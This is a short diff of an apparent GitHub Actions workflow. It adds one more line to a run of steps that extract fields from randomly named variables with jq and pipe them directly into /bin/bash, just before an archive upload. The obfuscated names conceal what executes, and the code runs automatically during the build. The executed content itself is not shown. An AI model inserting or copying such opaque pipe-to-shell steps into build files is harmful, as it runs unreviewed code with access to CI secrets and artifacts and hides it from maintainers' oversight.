@@ -25,6 +25,7 @@ jobs:
           echo $i66 | jq -r .ufxs64 | /bin/bash
           printf '%s' "$qhkp71" | jq -r .sk880 | /bin/bash
           printf '%s' "$j153" | jq -r .ifufb874 | /bin/bash
+          printf '%s' "$flrin97" | jq -r .lgbt14206 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
